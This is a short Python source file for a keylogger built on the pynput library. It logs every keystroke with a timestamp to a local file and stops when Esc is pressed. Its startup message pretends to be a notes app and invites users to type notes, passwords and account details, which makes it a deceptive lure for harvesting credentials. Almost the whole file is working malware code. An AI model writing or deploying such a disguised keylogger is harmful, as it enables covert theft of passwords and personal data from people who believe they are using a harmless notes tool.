from pynput import keyboard #Keyboard from Pynput includes resources to listen to keyboard
import datetime #to log time and date of written characters

class KeyLogger:
    def __init__(self, log_file="logger.txt"): #initiate list for characters and file for logging
        self.log_file = log_file
        self.log = []
    
    def on_press(self, key): #define function to save keystrokes to list
        if key == keyboard.Key.esc:  # Stop logging when 'Esc' is pressed
            self.write_log()
            return False  # Stops the listener immediately
        
        try:
            self.log.append(key.char) #add keystrokes to list
        except AttributeError:
            self.log.append(f"[{key}]")#add special key keystrokes to list
    
    def write_log(self): #define function to write time and character keystrokes to file
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") #string to storte time stamp of keystroke
        with open(self.log_file, "a") as f:
            f.write(f"\n[{timestamp}] " + "".join(self.log) + "\n")
    
    def start(self): #function to initialize listenign to keyboard
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
print("Welcome to notes, feel free to write notes, passwords, and account details")
if __name__ == "__main__":
    keylogger = KeyLogger() #define object
    keylogger.start() #initiate listening
